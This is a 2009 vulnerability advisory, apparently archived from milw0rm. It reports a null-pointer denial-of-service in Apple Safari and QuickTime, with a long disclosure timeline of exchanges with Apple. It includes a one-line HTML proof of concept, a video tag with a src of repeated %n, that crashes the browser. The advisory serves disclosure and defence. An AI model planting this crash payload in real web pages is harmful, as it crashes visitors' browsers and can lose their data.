@@ -1,0 +1,130 @@
+________________________________________________________________________
+
+               Apple Safari & Quicktime Denial of Service
+________________________________________________________________________
+
+Shameless plug :
+------------------------------------------------------------------------
+You are invited to join the 2009 edition of HACK.LU, a small but 
+concentrated luxemburgish security conference. 
+More information : http://www.hack.lu - CFP is open, sponsorship is still 
+possible and warmly welcomed.
+------------------------------------------------------------------------
+
+Release mode: Coordinated
+Ref         : [TZO-36-2009] - Apple Safari & Quicktime DoS
+Vendor      : http://www.apple.com
+WWW         : http://blog.zoller.lu/2009/05/advisory-apple-safari-quicktime-dos.html
+Status      : Not patched
+Credit      : none given (Apple can't find a place to credit)
+Discovered  : 18.11.2008 Zoller, 19.06.2009 Alexios Fakos (probably plenty
+              of others)
+Security notification reaction rating : good
+Notification to patch window : n+1 
+
+Disclosure Policy : http://blog.zoller.lu/2008/09/notification-and-disclosure-policy.html
+
+Affected products  
+- Apple Safari (all)
+- Quicktime (all)
+
+
+I. Background
+~~~~~~~~~~~
+Wikipedia quote: "Apple Inc. (NASDAQ: AAPL) is an American multinational 
+corporation which designs and manufactures consumer electronics and 
+software products. The company's best-known hardware products include 
+Macintosh computers, the iPod and the iPhone."
+
+II. Description
+~~~~~~~~~~~~~
+A null pointer is being dereference when CFRelease() is called on NULL.
+
+III. Impact
+~~~~~~~~~
+The browser will crash, your data might be lost.
+
+IV. Proof of concept (hold your breath)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<html>
+<video src=%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n>Video</video>
+</html>
+
+V. Disclosure timeline
+~~~~~~~~~~~~~~~~~~~~~~~
+DD/MM/YYYY
+18/11/2008 : Send proof of concept file and a description that failed to
+             give the correct impact.
+        
+25/11/2009 : Apple acknowledges receipt and reproducability :  
+             "After investigating this issue further, we've determined 
+             that the crash your test case triggers is caused by
+             dereferencing a null pointer and not from a format string issue"
+                         
+20/01/2009 : Ask for an update                   
+                         
+23/01/2009 : Apple sends an encrypted and signed PGP mail, fine, however the mail
+             is encrypted with their own key
+
+23/01/2009 : Ask for the mail to be resend as I don't have Apple's private key
+
+24/01/2009 : Apple states that "Regarding the QuickTime null dereference you 
+             reported, this bug is still being worked on by our engineers 
+             and is not addressed in QuickTime 7.6"
+                         
+26/01/2009 : Ask apple for a fix timeline as this is an ridiculouly easy to fix
+             vulnerability                       
+                         
+27/01/2009 : Apple statest "Regarding the QuickTime null deref issue, it is 
+             currently set to be part of the next QuickTime update.  [..] 
+             Additionally, we do not intend to describe this crasher in our
+             security advisory.
+                         
+             Note: No Security advisory = no credit, should have published here.
+                         
+28/01/2009: Apple states "Given that we are handling this as a crasher and 
+            not as a security exposure, it stands to reason that you may 
+            want to disclose it without waiting for the update that
+            addresses it and without further coordination with Apple.
+            We do appreciate the fact that you reported it to us and are
+            intending to address it in the next available update"
+
+[..]                    
+[Several discussion about CIA, why a DoS against the iPhone is worth a security
+advisory, when it isn't against safari.. etc. I spare you the details]                  
+[..]
+
+29/01/2009 : Ask why I should hold disclosure for a DoS in a particular
+             portable apple product but disclose DoS in other apple products.
+             Asked apple to make a choice, either DoS is a security issue and
+             I won't disclose or it isn't and I disclose all of them,
+             including the one in the very portable apple product
+                          
+30/01/2009  : Apple answers that
+             "Your QuickTime and Safari issues constitute denial of service.
+             We consider any denial of service issue to be security related,
+             and they are important to fix.  We plan to fix the ones you
+             reported in the next available updates."
+
+             "I believe we can put credit in an appropriate place for the
+             WebKit/Safari change.  I was not able to locate a suitable place
+             for crediting the QuickTime crasher"
+                          
+Fast forward 5 months, and apple releases a stream of code execution bug fixes
+for Quicktime.
+
+01/06/2009 : Ask for an update and if the DoS condition has been fixed
+                          
+02/06/2009 : Apple states that 
+             "According to our bug tracking system the null-dereference crasher
+             issue is not yet addressed in QuickTime.  We are investigating
+             now to see if for some reason the latest version has picked up
+             changes that address this issue and will send you feedback
+             today about it."
+        
+In summary, no credit, no advisory, and 7 months of time to (not) fix a
+single  line  of  code.
+
+10/06/2009 : Release of this advisory
+
+# milw0rm.com [2009-06-15]
